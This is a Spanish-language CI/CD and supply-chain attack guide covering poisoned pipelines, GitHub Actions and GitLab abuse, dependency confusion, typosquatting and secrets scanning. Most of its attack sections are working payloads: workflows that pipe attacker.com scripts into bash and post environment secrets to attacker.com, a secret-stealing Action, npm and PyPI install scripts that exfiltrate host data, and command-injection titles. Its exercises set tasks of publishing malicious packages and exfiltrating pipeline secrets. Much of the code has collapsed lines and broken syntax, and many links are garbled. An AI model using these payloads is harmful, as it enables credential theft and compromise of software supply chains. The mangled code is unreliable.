# ci/cd Hacking --- Guia completa de devsecops y Supply Chain Security

> **Autor:** Equipo de Investigacion
> **Idioma:** Espanol (Argentina) --- Informal tecnico
> **Nivel:** Intermedio a Avanzado
> **Duracion estimada:** 2-3 semanas de estudio intensivo

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2147 lineas)


- 1. Introduccion a [ci/cd Security](#1-introduccion-a-cicd-security) - [1.1 Que es CI/CD?](#11-que-es-cicd) - [1.2 Supply Chain Security: El Eslabon Mas Debil](#12-supply-chain-security-el-eslabon-mas-debil) - 1.3 Vec[tores de Ataque en CI/CD](#13-vectores-de-ataque-en-cicd) - 1.4 Panorama Actual de Ataques a la C[adena de Suministro](#14-panorama-actual-de-ataques-a-la-cadena-de-suministro) - [1.5 Configuracion del Entorno de Laboratorio](#15-configuracion-del-entorno-de-laboratorio)
- 2. Poisoned [p[ipeline](./raw/c1cd Execution (PPE)](#2-poisoned-[pipeline](../raw/c1cd-h4ck1ng.md#pipeline)-execution-ppe) - [2.1 Que es un Pipeline Envenenado?](#21-que-es-un-pipeline-envenenado) - [2.2 Direct PPE: Modificacion Directa del Pipeline](#22-direct-ppe-modificacion-directa-del-pipeline) - 2.3 Indirect PPE: Depende[ncias comprometidas](#23-indirect-ppe-dependencias-comprometidas) - 2.4 [ci/cd](../raw/c1cd-h4ck1ng.md) [variable Injection](#24-cicd-variable-injection) - [2.5 Artifact Poisoning](#25-artifact-poisoning) - [2.6 Build Process Hijacking](#26-build-process-hijacking) - [2.7 Ejercicio Practico: PPE Attack](#27-ejercicio-practico-ppe-attack)
- [3. GitHub Actions Abuse](#3-github-actions-abuse) - [3.1 Arquitectura de GitHub Actions](#31-arquitectura-de-github-actions) - [3.2 Self-Hosted Runner Compromise](#32-self-hosted-runner-compromise) - [3.3 Action Poisoning](#33-action-poisoning) - [3.4 Secrets Exfiltration desde Actions](#34-secrets-exfiltration-desde-actions) - [3.5 OIDC Token Abuse](#35-oidc-token-abuse) - [3.6 Workflow Injection](#36-workflow-injection) - [3.7 Ejercicio Practico: GitHub Actions Attack](#37-ejercicio-practico-github-actions-attack)
- 4. GitLab CI/CD [exploitation](#4-gitlab-cicd-exploitation) - [4.1 Arquitectura de GitLab CI/CD](#41-arquitectura-de-gitlab-cicd) - [4.2 Pipeline Manipulation](#42-pipeline-manipulation) - [4.3 Runner Abuse](#43-runner-abuse) - [4.4 Variable Overriding](#44-variable-overriding) - [4.5 GitLab CI/CD Token Theft](#45-gitlab-cicd-token-theft) - [4.6 Ejercicio Practico: GitLab CI Attack](#46-ejercicio-practico-gitlab-ci-attack)
- [5. Dependency Confusion](#5-dependency-confusion) - [5.1 Que es Dependency Confusion?](#51-que-es-dependency-confusion) - [5.2 Public vs Private Package Hijacking](#52-public-vs-private-package-hijacking) - [5.3 Typo-squatting en npm](#53-typo-squatting-en-npm) - [5.4 Typo-squatting en pip (PyPI)](#54-typo-squatting-en-pip-pypi) - [5.5 Typo-squatting en Maven](#55-typo-squatting-en-maven) - [5.6 Typo-squatting en RubyGems](#56-typo-squatting-en-rubygems) - [5.7 Dependency Confusion Automation](#57-dependency-confusion-automation) - [5.8 Ejercicio Practico: Dependency Confusion](#58-ejercicio-practico-dependency-confusion)
- 6. Secrets R[otation y Hardcoded Credentials](#6-secrets-rotation-y-hardcoded-credentials) - [6.1 Escaneo de Codigo en Busca de Secrets](#61-escaneo-de-codigo-en-busca-de-secrets) - [6.2 TruffleHog: Busqueda Avanzada de Secrets](#62-trufflehog-busqueda-avanzada-de-secrets) - [6.3 Gitleaks: Escaneo de Repositorios Git](#63-gitleaks-escaneo-de-repositorios-git) - [6.4 GitMiner: Mineria de Secrets en GitHub](#64-gitminer-mineria-de-secrets-en-github) - [6.5 Deteccion de Secrets en Tiempo Real](#65-deteccion-de-secrets-en-tiempo-real) - [6.6 Rotacion Automatica de Secrets](#66-rotacion-automatica-de-secrets) - [6.7 Ejercicio Practico: Secrets Discovery](#67-ejercicio-practico-secrets-discovery)
- [7. Git History Attacks](#7-git-history-attacks) - 7.1 Fo[rce Push Recovery](#71-force-push-recovery) - [7.2 Commit Analysis](#72-commit-analysis) - [7.3 .git Directory Exposure](#73-git-directory-exposure) - [7.4 Git Object Recovery](#74-git-object-recovery) - [7.5 Ejercicio Practico: Git History Attack](#75-ejercicio-practico-git-history-attack)
- 8. [docker Supply Chain](#8-docker-supply-chain) - [8.1 Base Image Poisoning](#81-base-image-poisoning) - [8.2 Multi-Stage Build Attacks](#82-multi-stage-build-attacks) - [8.3 Docker Hub Typosquatting](#83-docker-hub-typosquatting) - [8.4 Docker Registry Exploitation](#84-docker-registry-exploitation) - [8.5 Ejercicio Practico: Docker Supply Chain](#85-ejercicio-practico-docker-supply-chain)
- [9. CI/CD Security Assessment](#9-cicd-security-assessment) - [9.1 Hardening de Pipelines](#91-hardening-de-pipelines) - [9.2 Least Privilege para Runners](#92-least-privilege-para-runners) - [9.3 Secrets Management](#93-secrets-management) - [9.4 Auditoria de Acceso](#94-auditoria-de-acceso) - [9.5 Herramientas de Seguridad CI/CD](#95-herramientas-de-seguridad-cicd) - [9.6 Checklist de Seguridad](#96-checklist-de-seguridad)
- [10. Escenarios de Ataque Completos](#10-escenarios-de-ataque-completos) - [10.1 Escenario 1: SolarWinds-style Attack](#101-escenario-1-solarwinds-style-attack) - [10.2 Escenario 2: Dependency Confusion en Empresa](#102-escenario-2-dependency-confusion-en-empresa) - [10.3 Escenario 3: Pipeline Takeover](#103-escenario-3-pipeline-takeover) - [10.4 Escenario 4: Secrets Exfiltration Masiva](#104-escenario-4-secrets-exfiltration-masiva)
- [11. Defensa y Buenas Practicas](#11-defensa-y-buenas-practicas) - [11.1 Principios de Confianza Zero en CI/CD](#111-principios-de-confianza-zero-en-cicd) - [11.2 Monitoreo de Pipelines](#112-monitoreo-de-pipelines) - [11.3 SBOM y Firmado de Artefactos](#113-sbom-y-firmado-de-artefactos) - [11.4 Respuesta a Incidentes de Supply Chain](#114-respuesta-a-incidentes-de-supply-chain)
- [12. Apendices](#12-apendices) - [12.1 Cheatsheet de Comandos](#121-cheatsheet-de-comandos) - [12.2 YAML Pipeline Templates](#122-yaml-pipeline-templates) - [12.3 Herramientas y Recursos](#123-herramientas-y-recursos)

---

## 1. Introduccion a [ci/cd](../raw/c1cd-h4ck1ng.md) Security

### 1.1 Que es CI/CD?

CI/CD significa Continuous Integration y Continuous Delivery/Deployment. Es la practica de automatizar la construccion, prueba y despliegue de software.

**componentes de CI/CD:**
- **Version Control:** Git (GitHub, GitLab, Bitbucket)
- **Build System:** Compila el codigo, ejecuta tests
- **Artifact Repository:** Almacena los artefactos generados
- **Deployment System:** Despliega a produccion
- **Orchestrator:** Coordina el flujo (Jenkins, GitHub Actions, GitLab CI, CircleCI)

**Flujo tipico de CI/CD:**
```
Developer commit -> Git push -> Build -> Test -> Package -> Deploy -> Production
```

Cada etapa del pipeline es un punto potencial de ataque.

### 1.2 Supply Chain Security: El Eslabon Mas Debil

La cadena de suministro de software incluye todo lo que tu equipo no escribe directamente:
- Dependencias de terceros (npm, pip, maven, etc.)
- Imagenes de [docker](../raw/d0ck3r-f0r-h4ck3rs.md) base
- Acciones de GitHub de terceros
- Plugins de CI/CD
- Herramientas de build

**Ataques famosos a la cadena de suministro:**
- **SolarWinds (2020):** Compromiso del [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) de build de SolarWinds Orion
- **Codecov (2021):** Compromiso del script de bash de Codecov
- **Kaseya (2021):** Ransomware via actualizacion de software
- **Log4j (2021):** [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) en dependencia omnipresente
- **3CX (2023):** Supply chain attack via DLL hijacking

### 1.3 Vectores de Ataque en CI/CD

1. **Credenciales expuestas en pipelines**
2. **Dependencias maliciosas (dependency confusion)**
3. **Modificacion de pipelines (PPE)**
4. **Compromiso de runners/agentes**
5. **Exfiltracion de secrets de CI/CD**
6. **Manipulacion de artefactos**
7. **Abuso de OIDC tokens**
8. **Git history attacks**

### 1.4 Panorama Actual de Ataques a la Cadena de Suministro

- 2022-2024: Aumento del 650% en ataques a la cadena de suministro
- 1 de cada 8 organizaciones experimento un ataque de supply chain
- El 80% de los ataques involucran dependencias de terceros
- Los pipelines CI/CD son el objetivo #1 para APT groups

### 1.5 Configuracion del Entorno de Laboratorio

```bash
# Cuentas necesarias:
# - Cuenta GitHub (gratuita)
# - Cuenta GitLab (gratuita)
# - Cuenta Docker Hub (gratuita)
# - Cuenta npm/PyPI (para pruebas de dependency confusion)

# Herramientas locales:
pip install trufflehog gitleaks

# TruffleHog
git clone https://github.com/trufflesecurity/trufflehog
cd trufflehog
go build .

# Gitleaks
git clone https://github.com/gitleaks/gitleaks
cd gitleaks
go build .

# GitMiner
git clone https://github.com/UnkL4b/GitMiner
pip install -r requirements.txt

# Node.js para pruebas
choco install nodejs -y
npm install -g dependency-confusion-scanner

# Configurar GitHub CLI
choco install gh -y
gh auth login

# Configurar GitLab CLI
choco install glab -y
glab auth login
```

---

## 2. Poisoned p[ipeline](./raw/c1cd Execution (PPE)

### 2.1 Que es un [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) Envenenado?

PPE (Poisoned Pipeline Execution) es una tecnica donde un atacante compromete la definicion del pipeline [ci/cd](../raw/c1cd-h4ck1ng.md) para ejecutar codigo malicioso en el contexto del pipeline.

**Tipos de PPE:**
1. **Direct PPE:** El atacante modifica directamente el archivo de pipeline (ej: `.github/workflows/`, `.gitlab-ci.yml`)
2. **Indirect PPE:** El atacante compromete una dependencia del pipeline (una Action, un plugin, un script externo)

### 2.2 Direct PPE: Modificacion Directa del Pipeline

**Escenario:**
Un atacante obtiene acceso de escritura al repositorio. Modifica el pipeline para ejecutar codigo malicioso.

**Pipeline vulnerable (GitHub Actions):**
```yaml
name: Deploy to Production
on: push: branches: [main]

jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Run deploy script run: | chmod +x deploy.sh ./deploy.sh - name: Deploy to AWS run: | aws s3 sync ./dist s3://production-bucket/
```

**Ataque: Modificar el pipeline para robar credenciales [aws](../raw/cl0ud-h4ck1ng.md#aws):**
```yaml
name: Deploy to Production
on: push: branches: [main]

jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Install tools run: | curl http://attacker.com/malware.sh | bash  # MALICIOSO! - name: Exfiltrar credenciales run: | # Enviar todas las env vars a atacante curl -X POST http://attacker.com/steal \ -d "$(env | base64 -w 0)" - name: Run deploy script run: | chmod +x deploy.sh ./deploy.sh - name: Deploy to AWS env: AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }} AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }} run: | # Exfiltrar secrets explicitamente curl -X POST http://attacker.com/steal \ -d "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID&AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" aws s3 sync ./dist s3://production-bucket/
```

### 2.4 CI/CD [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) Injection

**Inyeccion de variables para modificar comportamiento del pipeline:**

```yaml
# Pipeline vulnerable a inyeccion de variables
name: CI Pipeline
on: pull_request: branches: [main]

jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Ejecutar script con variable insegura run: | echo "Building version: ${{ github.event.pull_request.title }}" # Si el PR title contiene: "; curl http://attacker.com/evil.sh | bash;" # Se va a ejecutar! eval "echo Building version: ${{ github.event.pull_request.title }}"
```

**Explotacion:**
```bash
# Crear PR con titulo malicioso
gh pr create --title '$(curl http://attacker.com/evil.sh | bash)' --body 'test'
```

### 2.6 Build Process Hijacking

**Secuestrar el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de build para inyectar codigo en el artefacto:**

```yaml
# Pipeline de build con riesgo de hijacking
name: Build and Package
on: push: branches: [main]

jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Build run: | npm install npm run build - name: Package run: | # Si algun paso modifica node_modules, el build cambia tar -czf artifact.tar.gz dist/ - name: Upload artifact uses: actions/upload-artifact@v3 with: name: build-artifact path: artifact.tar.gz
```

### 2.7 Ejercicio Practico: PPE Attack

**Escenario:** Encontraste un repositorio publico con un pipeline que se ejecuta en cada PR. El pipeline tiene acceso a secrets de produccion.

**Tarea:** Crear un PR que explote el pipeline para exfiltrar los secrets.

**Pistas:**
1. Analiza el workflow de GitHub Actions en el repositorio.
2. Busca variables del contexto que puedas inyectar.
3. Usa `${{ github.event.issue.title }}` u otras variables no sanitizadas.
4. Configura un webhook receiver para capturar los datos.

---

## 3. GitHub Actions Abuse

### 3.1 Arquitectura de GitHub Actions

GitHub Actions permite automatizar flujos de trabajo dentro de GitHub.

**componentes:**
- **Workflow:** Archivo YAML en `.github/workflows/`
- **Job:** Unidad de trabajo dentro de un workflow
- **Step:** Paso individual dentro de un job
- **Action:** Reutilizable (puede ser de GitHub, del marketplace, o propia)
- **Runner:** Maquina donde se ejecuta el workflow
- **Event:** Disparador del workflow (push, PR, schedule, etc.)

### 3.2 Self-Hosted Runner Compromise

Los self-hosted runners son maquinas que la organizacion administra y conecta a GitHub. Si un atacante compromete un runner, puede ejecutar workflows con los [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) asociados.

```yaml
# Workflow que se ejecuta en self-hosted runner
name: Build on Self-Hosted
on: [push]

jobs: build: runs-on: self-hosted steps: - uses: actions/checkout@v3 - name: Build run: | # Si el runner esta comprometido, cualquier codigo se ejecuta # en la maquina de la organizacion make build
```

**Ataque a self-hosted runner:**
1. Encontrar un repositorio que use self-hosted runners
2. Crear un fork y un PR con codigo malicioso
3. El p[ipeline](./raw/c1cd se ejecuta en el runner de la organizacion
4. Desde el runner, pivotear a la [red](../raw/r3d3s-f0nd4m3nt0s.md) interna

```bash
# Script para ejecutar en self-hosted runner comprometido
#!/bin/bash
# Exfiltrar informacion del runner
whoami > /tmp/info.txt
hostname >> /tmp/info.txt
ip addr >> /tmp/info.txt
env >> /tmp/info.txt

# Escanear red interna
nmap -sn 10.0.0.0/24 -oN /tmp/scan.txt

# Intentar acceder a metadata service cloud
curl -s http://169.254.169.254/latest/meta-data/ >> /tmp/cloud.txt
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >> /tmp/azure.txt

# Enviar todo
curl -X POST http://attacker.com/exfil -F "data=@/tmp/info.txt" -F "scan=@/tmp/scan.txt"
```

### 3.3 Action Poisoning

Las Actions de terceros del Marketplace son ejecutadas en el contexto del [pipeline](../raw/c1cd-h4ck1ng.md#pipeline). Si una Action es comprometida, todos los que la usan estan en riesgo.

```yaml
# Usar una Action maliciosa
name: CI
on: [push]

jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - name: Usar action maliciosa uses: attacker/evil-action@v1  # Esta action roba secrets!
```

**Crear una Action maliciosa:**
```bash
# action.yml de una Action maliciosa
name: 'Malicious Action'
description: 'Roba secrets del pipeline'
inputs: myInput: description: 'Input' required: false
runs: using: 'node16' main: 'index.js'
```

```javascript
// index.js - Action que roba secrets
const core = require('@actions/core');

async function run { try { // Leer todas las variables de entorno (contienen secrets!) const envVars = process.env; // Enviar a atacante const response = await fetch('http://attacker.com/steal', { method: 'POST', body: JSON.stringify(envVars), headers: { 'Content-Type': 'application/json' } }); core.setOutput('result', 'done'); } catch (error) { core.setFailed(error.message); }
}

run;
```

**Version con exfiltracion via [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns):**
```javascript
const dns = require('dns');

async function exfiltrateViaDNS(data) { // Convertir datos a subdominio y hacer DNS lookup const encoded = Buffer.from(JSON.stringify(data).toString('hex'); dns.resolve(`${encoded}.attacker.com`, (err) => {});
}
```

### 3.4 Secrets Exfiltration desde Actions

GitHub Actions tiene acceso a `secrets.XXX` que se mapean a environment variables.

```yaml
name: Deploy
on: [push]

jobs: deploy: runs-on: ubuntu-latest steps: - name: Deploy to prod env: AWS_KEY: ${{ secrets.AWS_ACCESS_KEY }} DB_PASS: ${{ secrets.DB_PASSWORD }} API_KEY: ${{ secrets.API_KEY }} run: | # Los secrets estan en environment variables # Cualquier comando en run puede leerlas echo $AWS_KEY | base64 env | grep -E 'AWS_KEY|DB_PASS|API_KEY'
```

**Formas de exfiltrar secrets:**
1. Usando `env` en el step
2. Usando print/echo a un archivo y subiendolo
3. Usando `curl` o `wget` a servidor atacante
4. Usando GitHub API para crear un issue con los datos
5. Usando acciones de terceros que filtran datos

### 3.5 OIDC Token Abuse

GitHub Actions puede usar OIDC para asumir roles en [aws](../raw/cl0ud-h4ck1ng.md#aws)/[azure](../raw/cl0ud-h4ck1ng.md#azure)/[gcp](../raw/cl0ud-h4ck1ng.md#gcp) sin credenciales estaticas.

```yaml
name: Deploy to AWS
on: [push]

permissions: id-token: write  # Necesario para OIDC contents: read

jobs: deploy: runs-on: ubuntu-latest steps: - name: Configure AWS credentials uses: aws-actions/configure-aws-credentials@v2 with: role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole aws-region: us-east-1 - name: Deploy run: | aws s3 sync . s3://production-bucket/
```

**Abuso del OIDC token:**
```yaml
name: Abusar OIDC
on: [push]

permissions: id-token: write contents: read

jobs: steal: runs-on: ubuntu-latest steps: - name: Configurar AWS uses: aws-actions/configure-aws-credentials@v2 with: role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole aws-region: us-east-1 - name: Robar datos run: | # Tenemos acceso al rol de AWS! aws sts get-caller-identity aws s3 ls aws secretsmanager list-secrets # Exfiltrar aws secretsmanager get-secret-value --secret-id prod/db/password | curl -X POST http://attacker.com/steal -d @-
```

### 3.6 Workflow Injection

**Inyeccion de comandos via inputs no sanitizados:**

```yaml
name: Issue Responder
on: issues: types: [opened]

jobs: respond: runs-on: ubuntu-latest steps: - name: Responder a issue run: | echo "Gracias por tu reporte: ${{ github.event.issue.title }}"
```

**Explotacion:**
```
Issue title: "; curl http://attacker.com/revshell.sh | bash;"
```

**Forma segura:**
```yaml
- name: Responder a issue run: | echo "Gracias por tu reporte: $TITLE" env: TITLE: ${{ github.event.issue.title }}
```

### 3.7 Ejercicio Practico: GitHub Actions Attack

**Escenario:** Una empresa tiene un repositorio con un self-hosted runner. El pipeline despliega a AWS usando OIDC.

**Tarea:** Crear un PR que:
1. Extraiga las credenciales AWS via OIDC
2. Liste los buckets [s3](../raw/cl0ud-h4ck1ng.md#s3)
3. Exfiltre los datos

**Pistas:**
1. Forkea el repositorio.
2. Modifica el workflow para agregar un step de exfiltracion.
3. Usa `aws configure` con el role-to-assume.
4. Envia los datos a un RequestBin o servidor propio.

---

## 4. GitLab [ci/cd](../raw/c1cd-h4ck1ng.md) exploitation

### 4.1 Arquitectura de GitLab CI/CD

GitLab CI/CD usa archivos `.gitlab-ci.yml` en la raiz del repositorio.

**componentes:**
- **p[ipeline](./raw/c1cd:** Conjunto de stages y jobs
- **Stage:** Fase del [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) (build, test, deploy)
- **Job:** Unidad de trabajo
- **Runner:** Ejecutor de jobs
- **variables:** De CI/CD, de proyecto, de grupo

### 4.2 Pipeline Manipulation

```yaml
# .gitlab-ci.yml vulnerable
stages: - build - test - deploy

variables: DEPLOY_ENV: production

build-job: stage: build script: - echo "Building.." - npm install - npm run build

test-job: stage: test script: - echo "Testing.." - npm test

deploy-job: stage: deploy script: - echo "Deploying to $DEPLOY_ENV" - aws s3 sync dist/ s3://$DEPLOY_ENV-bucket/ only: - main
```

**Ataque:** Modificar `.gitlab-ci.yml` a traves de un merge request:
```yaml
deploy-job: stage: deploy script: - echo "Exfiltrando secrets.." - curl -X POST http://attacker.com/steal -d "$(env)" - echo "Deploying to $DEPLOY_ENV" - aws s3 sync dist/ s3://$DEPLOY_ENV-bucket/
```

### 4.4 [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) Overriding

GitLab permite override de variables CI/CD. Si un atacante puede modificar variables, puede cambiar el comportamiento del pipeline.

```yaml
# Uso de variables CI/CD
script: - ./deploy.sh $CI_ENVIRONMENT_NAME
```

**Override via merge request:**
```yaml
variables: CI_ENVIRONMENT_NAME: "production; curl http://attacker.com/evil.sh | bash"
```

### 4.5 GitLab CI/CD Token Theft

```bash
# El token CI_JOB_TOKEN esta disponible durante la ejecucion del pipeline
# Si se expone, permite autenticarse como el pipeline

# Encontrar el token en logs
cat /var/log/gitlab-runner/gitlab-runner.log | grep CI_JOB_TOKEN

# Usar el token para acceder a la API de GitLab
curl --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" "https://gitlab.com/api/v4/projects"
```

### 4.6 Ejercicio Practico: GitLab CI Attack

**Escenario:** Un proyecto GitLab tiene un pipeline que se ejecuta en merge requests. El pipeline tiene acceso a variables de produccion.

**Tarea:** Crear un MR que exfiltre las variables del pipeline.

**Pistas:**
1. Identifica las variables disponibles en el pipeline.
2. Agrega un job que las exfiltre.
3. Usa `curl` para enviar los datos.
4. Si no hay conectividad externa, usa GitLab API para crear un issue con los datos.

---

## 5. Dependency Confusion

### 5.1 Que es Dependency Confusion?

Dependency confusion ocurre cuando un gestor de paquetes descarga una dependencia de un repositorio publico en vez del repositorio privado interno, porque el nombre del paquete coincide.

**como funciona:**
1. Una empresa usa un paquete interno llamado `internal-auth-lib`
2. El gestor busca primero en el registro publico (npm, PyPI, etc.)
3. Si existe un paquete publico con el mismo nombre, lo descarga
4. El atacante sube un paquete malicioso con ese nombre

### 5.2 Public vs Private Package Hijacking

**Deteccion de paquetes internos vulnerables:**

```bash
# Buscar nombres de paquetes internos en el codigo
grep -r "from.*internal\|require.*internal\|import.*internal" . --include="*.py" --include="*.js" --include="*.java"

# Identificar dependencias en package.json
cat package.json | jq '.dependencies' | grep -v "@[^/]*$"

# Identificar dependencias en requirements.txt
cat requirements.txt | grep -v "^#\|^$\|@\|--extra-index-url"

# Identificar en pom.xml
grep -A2 "<dependency>" pom.xml | grep "<groupId>\|<artifactId>"
```

**Subir paquete malicioso a npm:**
```bash
# Crear paquete de dependency confusion
mkdir evil-package
cd evil-package
npm init -y
# Nombre: internal-auth-lib (el mismo que usa la empresa)

# Crear script de instalacion malicioso
cat > preinstall.js << 'EOF'
const http = require('http');
const os = require('os');

const data = { hostname: os.hostname, user: os.userInfo, env: process.env, cwd: process.cwd
};

const options = { hostname: 'attacker.com', port: 80, path: '/steal', method: 'POST', headers: { 'Content-Type': 'application/json' }
};

const req = http.request(options);
req.write(JSON.stringify(data);
req.end;
EOF
```

```json
// package.json modificado
{ "name": "internal-auth-lib", "version": "99.0.0", "scripts": { "preinstall": "node preinstall.js", "install": "node preinstall.js", "postinstall": "node preinstall.js" }
}
```

```bash
# Publicar en npm
npm login
npm publish
```

### 5.3 Typo-squatting en npm

Crear paquetes con nombres similares a los originales:

```bash
# Paquetes populares para typosquatting:
# react -> raect, recte, reacct
# lodash -> lodahs, lodsh, lodas
# express -> expres, exprss, expresss
# axios -> axois, axioz, aaxios
# moment -> momen, momet, moment
# request -> reqest, requst, requestt

# Crear typo-squatting package
npm init -y
# Nombre: recte (suena a "react")

# El codigo malicioso se ejecuta al instalar
```

```bash
# Script para escanear typo-squatting potencial
# node_typo_check.js
const known = ['express', 'react', 'lodash', 'axios', 'moment', 'request'];
const suspicious = ;

known.forEach(pkg => { // Generar variaciones con typos comunes const variations = [ pkg.replace(/^e/, 'a'),  // expres -> aexpress pkg.replace(/s$/, 'z'),  // express -> expressz pkg + '-official', // express-official pkg + '-help', // express-help pkg.replace('re', 'er') // express -> exprerss ]; suspicious.push(..variations);
});

console.log('Posibles typo-squatting:', suspicious);
```

### 5.4 Typo-squatting en pip (PyPI)

```bash
# Crear paquete malicioso en PyPI
mkdir evil-pypi
cd evil-pypi

cat > setup.py << 'EOF'
import os
import requests
from setuptools import setup

# Ejecutar en el momento de la instalacion
data = { 'hostname': os.uname.nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME'), 'user': os.environ.get('USERNAME') or os.environ.get('USER'), 'cwd': os.getcwd
}
try: requests.post('http://attacker.com/steal', json=data)
except: pass

setup( name='requrests',  # Typosquatting de requests! version='99.0.0', description='HTTP library', packages=, zip_safe=False
)
EOF

# Publicar
python setup.py sdist
twine upload dist/*
```

### 5.8 Ejercicio Practico: Dependency Confusion

**Escenario:** Una empresa usa un paquete privado llamado `acme-internal-utils`. Identificaste que no esta protegido contra dependency confusion.

**Tarea:** Crear un paquete malicioso con el mismo nombre y publicarlo.

**Pistas:**
1. Sube el paquete a npm/PyPI con el nombre exacto.
2. Usa version 99.0.0 (mas alta que la interna).
3. Incluye un script de postinstall que envie informacion del sistema.
4. Espera a que alguien instale la dependencia.

---

## 6. Secrets Rotation y Hardcoded Credentials

### 6.1 Escaneo de Codigo en Busca de Secrets

```bash
# Patrones comunes de secrets
# AWS Access Key: AKIA[0-9A-Z]{16}
# AWS Secret Key: [A-Za-z0-9/+=]{40}
# GitHub Token: ghp_[A-Za-z0-9]{36}
# Slack Token: xox[baprs]-[A-Za-z0-9-]{10,}
# Generic Password: password.*=.*['\"][A-Za-z0-9!@#$%^&*_+]{8,}['\"]
# JWT Token: eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}
# SSH Private Key: -----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----
```

**Busqueda manual con grep:**
```bash
# Buscar access keys
grep -rn "AKIA[0-9A-Z]\{16\}" . --include="*.py" --include="*.js" --include="*.java"

# Buscar passwords en configs
grep -rn "password\s*=" . --include="*.{json,yaml,yml,env,config,properties}"

# Buscar tokens
grep -rn "ghp_\|xox[baprs]\-|sk-" . --include="*"

# Buscar llaves SSH
grep -rn "BEGIN.*PRIVATE KEY" .
```

### 6.2 TruffleHog: Busqueda Avanzada de Secrets

```bash
# Escanear repositorio
trufflehog git https://github.com/victim/repo.git --json

# Escanear con busqueda de alta entropia
trufflehog git https://github.com/victim/repo.git --only-detected --json

# Escanear archivos locales
trufflehog filesystem --directory=/path/to/repo --json

# Escanear GitHub org
trufflehog github --org=victim-org --json

# Escanear GitLab
trufflehog gitlab --url=https://gitlab.com/victim-group --token=glpat-xxxx

# Escanear S3
trufflehog s3 --bucket=victim-bucket

# Escanear en modo detector completo
trufflehog git https://github.com/victim/repo.git \ --detector aws_access_key \ --detector github_token \ --detector slack_token \ --detector jwt_token

# Output a archivo
trufflehog git https://github.com/victim/repo.git --json > findings.json
```

### 6.3 Gitleaks: Escaneo de Repositorios Git

```bash
# Escaneo simple
gitleaks detect --source=/path/to/repo -v

# Escaneo de todo el historial git
gitleaks detect --source=/path/to/repo --log-opts="--all" -v

# Escaneo de un PR
gitleaks detect --source=/path/to/repo --log-opts="--all main.feature" -v

# Escaneo de archivos sin git
gitleaks detect --no-git --source=/path/to/dir

# Escaneo con reporte JSON
gitleaks detect --source=/path/to/repo --report-format=json --report-path=report.json

# Escaneo de un commit especifico
gitleaks detect --source=/path/to/repo --commits=abc123def

# Crear baseline para no repetir findings
gitleaks detect --source=/path/to/repo --baseline-path=.gitleaks-baseline

# Detectar leaks en stage antes de commit
gitleaks protect --staged -v
```

**Configuracion personalizada (.gitleaks.toml):**
```toml
title = "Gitleaks custom config"

[[rules]]
id = "my-custom-rule"
description = "Detecta patron especifico de la empresa"
regex = '''ACME_SECRET_[A-Za-z0-9]{32}'''
tags = ["acme", "custom"]

[[rules]]
id = "database-connection-string"
description = "Detecta connection strings"
regex = '''(mongodb|mysql|postgresql)://[^\s]+'''
tags = ["database", "connection-string"]

[allowlist]
description = "Excepciones"
paths = [ "test/.*", "vendor/.*", ".gitleaks.toml"
]
```

### 6.5 Deteccion de Secrets en Tiempo Real

**Pre-commit hook para prevenir commits con secrets:**

```bash
#!/bin/bash
# .git/hooks/pre-commit
echo "Escaneando secrets antes del commit.."

# Usar gitleaks
gitleaks protect --staged
if [ $? -ne 0 ]; then echo "ERROR: Se detectaron secrets! Corrigelos antes de commitear." exit 1
fi

# Usar trufflehog (alternativa)
# trufflehog git file://. --since HEAD --max-depth 1

echo "Scan completo - no se detectaron secrets."
exit 0
```

**GitHub Action para escaneo automatico:**
```yaml
name: Secret Scanning
on: [push, pull_request]

jobs: scan: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 with: fetch-depth: 0 - name: Gitleaks uses: gitleaks/gitleaks-action@v2 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} - name: TruffleHog run: | docker run --rm -v $(pwd):/repo trufflesecurity/trufflehog \ git file:///repo --since HEAD --fail --json
```

### 6.7 Ejercicio Practico: Secrets Discovery

**Escenario:** Te dieron acceso de solo lectura a un repositorio de una empresa.

**Tarea:** Encontrar secrets en el repositorio (incluyendo el historial git).

**Pistas:**
1. Clona el repositorio.
2. Usa gitleaks para escanear todo el historial.
3. Usa trufflehog para escaneo de alta entropia.
4. Revisa archivos de configuracion, .env, y archivos eliminados.
5. Usa `git log -p` para buscar patrones en commits viejos.

---

## 7. Git History Attacks

### 7.1 Force Push Recovery

Cuando alguien hace `git push --force`, los commits no se pierden inmediatamente. Quedan en el reflog y en los objetos sueltos.

```bash
# Ver reflog (historial local)
git reflog

# Ver commits que ya no estan en el branch
git log --all --reflog

# Recuperar commits de un force push
git reflog show origin/main
git fetch origin refs/reflog/*
git log --all --oneline --graph

# Recuperar un commit especifico
git checkout <commit-hash>

# Crear un branch con el commit recuperado
git branch recovered-branch <commit-hash>
```

### 7.2 Commit Analysis

Analizar el historial en busca de secrets eliminados:

```bash
# Buscar en todo el historial
